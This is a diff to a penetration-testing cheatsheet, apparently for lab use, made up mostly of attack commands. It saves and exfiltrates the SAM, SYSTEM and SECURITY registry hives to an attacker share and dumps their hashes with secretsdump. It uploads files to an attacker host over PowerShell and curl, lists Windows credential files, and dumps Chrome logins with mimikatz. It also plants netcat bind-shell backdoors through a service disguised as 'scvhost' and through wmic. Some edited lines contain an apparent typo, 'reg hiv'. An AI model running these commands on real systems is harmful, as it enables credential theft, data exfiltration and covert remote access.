@@ -110,7 +110,7 @@ Other great cheetsheets:
     - [7.2.6. FTP Server on Kali](#726-ftp-server-on-kali)
     - [7.2.7. SSHFS](#727-sshfs)
     - [7.2.8. Windows LOLBAS File Downloads](#728-windows-lolbas-file-downloads)
-    - [7.2.9. Windows Files of Interest](#729-windows-files-of-interest)
+    - [7.2.9. PHP File Uploads](#729-php-file-uploads)
   - [7.3. Grabbing Passwords](#73-grabbing-passwords)
     - [7.3.1. Finding Windows Passwords](#731-finding-windows-passwords)
     - [7.3.2. Windows Passwords in Registry](#732-windows-passwords-in-registry)
@@ -119,9 +119,10 @@ Other great cheetsheets:
     - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
       - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
     - [7.3.6. Using mimikatz to dump hashes and passwords](#736-using-mimikatz-to-dump-hashes-and-passwords)
-  - [7.4. Linux Files of Interest](#74-linux-files-of-interest)
-  - [7.5. Data Wrangling on Linux](#75-data-wrangling-on-linux)
-    - [7.5.1. Awk & Sed](#751-awk--sed)
+  - [7.4. Windows Files of Interest](#74-windows-files-of-interest)
+  - [7.5. Linux Files of Interest](#75-linux-files-of-interest)
+  - [7.6. Data Wrangling on Linux](#76-data-wrangling-on-linux)
+    - [7.6.1. Awk & Sed](#761-awk--sed)
 - [8. Windows Persistence](#8-windows-persistence)
   - [8.1. Remote SYSTEM Backdoor](#81-remote-system-backdoor)
     - [8.1.1. Using Windows Services](#811-using-windows-services)
@@ -1731,11 +1732,11 @@ void ControlHandler(DWORD request)
 ```
 
 Compile with `x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe`, then
-upload winsvc.exe to C:\Temp.
+upload winsvc.exe to `%temp%`.
 
 ```bat
 :: overwrite regsvc execution path
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\winsvc.exe /f
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d %temp%\winsvc.exe /f
 :: restart regsvc
 sc start regsvc
 ```
@@ -2391,35 +2392,47 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/
 powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 ```
 
-### 7.2.9. Windows Files of Interest
+### 7.2.9. PHP File Uploads
 
-```bat
-:: GPG keys
-dir /s /b /a C:\users\*.gpg
-:: usually under C:\Users\*\AppData\Roaming\gnupg\
+Uploading files via HTTP POST to `upload.php`:
 
-:: containing plaintext, encoded, or hashed credentials
-%SYSTEMDRIVE%\unattend.txt
-%SYSTEMDRIVE%\sysprep.inf
-%SYSTEMDRIVE%\sysprep\sysprep.xml
-%SYSTEMDRIVE%\pagefile.sys
-%WINDIR%\debug\NetSetup.log
-%WINDIR%\repair\sam
-%WINDIR%\repair\system
-%WINDIR%\repair\software
-%WINDIR%\repair\security
-%SYSTEMROOT%\ntds\ntds.dit
-%WINDIR%\iis6.log
-%WINDIR%\system32\config\AppEvent.Evt
-%WINDIR%\system32\config\SecEvent.Evt
-%WINDIR%\system32\config\default.sav
-%WINDIR%\system32\config\security.sav
-%WINDIR%\system32\config\software.sav
-%WINDIR%\system32\config\system.sav
-%WINDIR%\system32\CCM\logs\*.log
-%USERPROFILE%\ntuser.dat
-%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
+```php
+<?php
+// start php server from same directory as this file:
+// mkdir -p ../uploads && sudo php -S 0.0.0.0:80
+  $parentdir = dirname(dirname(__FILE__));
+  $uploaddir = $parentdir . '/uploads/';
+  $filename = basename($_FILES['file']['name']);
+  $uploadfile = $uploaddir . $filename;
+  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+You could also make Apache run it instead of standing up your own php server.
+Change the `$uploaddir` variable above to `'/var/www/uploads'`, and put the
+`upload.php` script in `/var/www/cgi-bin`. Requests will then point to
+`/cgi-bin/upload.php` instead of just `/upload.php`.
+
+Starting Apache server on Kali with necessary directories:
+
+```bash
+# make upload directory
+sudo mkdir -p /var/www/uploads
+sudo chown -R www-data:www-data /var/www/uploads
+# start server
+sudo systemctl restart apache2
+```
+
+Uploading files from Windows using PowerShell:
+
+```powershell
+(New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
+```
+
+Uploading files from Linux using curl:
+
+```sh
+curl -v http://192.168.119.144/upload.php -F "file=@somefile"
 ```
 
 ## 7.3. Grabbing Passwords
@@ -2497,23 +2510,26 @@ reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
 
 ```bat
 :: Grab them from the registry
-reg save hklm\sam .\sam.save /y
-reg save hklm\system .\system.save /y
-reg save hklm\security .\security.save /y
-copy .\sam.save \\192.168.119.144\share\sam.save
-copy .\system.save \\192.168.119.144\share\system.save
-copy .\security.save \\192.168.119.144\share\security.save
+reg save hklm\sam %TEMP%\sam.hiv /y
+reg hiv hklm\system %TEMP%\system.hiv /y
+reg hiv hklm\security %TEMP%\security.hiv /y
+copy %TEMP%\sam.hiv \\192.168.119.144\share\sam.hiv
+copy %TEMP%\system.hiv \\192.168.119.144\share\system.hiv
+copy %TEMP%\security.hiv \\192.168.119.144\share\security.hiv
+
+:: clean up stolen registry files
+del %TEMP%\*.hiv
 
 :: Grab the backups from disk
-copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.save
-copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.save
-copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.save
+copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.hiv
+copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.hiv
+copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.hiv
 ```
 
 Then, on attack box:
 ```sh
-# using impacket secretsdump.py (security.save optional)
-impacket-secretsdump -sam sam.save -system system.save -security security.save -outputfile secretsdump LOCAL
+# using impacket secretsdump.py (security.hiv optional)
+impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
 ```
 
 #### 7.3.5.1. Dumping Hashes from Windows Domain Controller
@@ -2551,7 +2567,38 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /u
 dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
-## 7.4. Linux Files of Interest
+## 7.4. Windows Files of Interest
+
+```bat
+:: GPG keys
+dir /s /b /a C:\users\*.gpg
+:: usually under C:\Users\*\AppData\Roaming\gnupg\
+
+:: containing plaintext, encoded, or hashed credentials
+%SYSTEMDRIVE%\unattend.txt
+%SYSTEMDRIVE%\sysprep.inf
+%SYSTEMDRIVE%\sysprep\sysprep.xml
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software
+%WINDIR%\repair\security
+%SYSTEMROOT%\ntds\ntds.dit
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+```
+
+## 7.5. Linux Files of Interest
 
 ```sh
 # quick command to grab the goods
@@ -2570,12 +2617,12 @@ tar zcf loot.tar.gz \
 /root/proof.txt
 ```
 
-## 7.5. Data Wrangling on Linux
+## 7.6. Data Wrangling on Linux
 
 Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
 be able to quickly sift through it to get the parts you care about.
 
-### 7.5.1. Awk & Sed
+### 7.6.1. Awk & Sed
 
 ```sh
 # grab lines of text between start and end delimiters.
@@ -2600,7 +2647,7 @@ net use \\VICTIM_NAME [PASSWORD] /u:Administrator
 net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
 
 :: open a backdoor netcat bind-shell with system privileges on a remote host
-sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k c:\temp\nc.exe -l -p 22222 -e cmd.exe"
+sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"
 
 :: start the service
 sc \\VICTIM_NAME start scvhost
@@ -2650,7 +2697,7 @@ at \\VICTIM_IP
 
 ```bat
 :: create admin bind-shell backdoor. Use '-d' for it to run without window
-wmic process call create "c:\temp\nc.exe -dlp 22222 -e cmd.exe"
+wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
 
 :: delete the wmic process
 wmic process where name="nc.exe" delete
@@ -2954,7 +3001,7 @@ firewalls and set up a SOCKS proxy through your tunnel.
 ```bat
 :: WINDOWS pivot
 :: enter temporary directory to store relay.bat
-cd c:\temp
+cd %temp%
 :: create relay.bat to connect to victim service
 echo nc $VICTIM_IP VICTIM_PORT > relay.bat
 :: Set up pivot listener (-L is persistent listener)
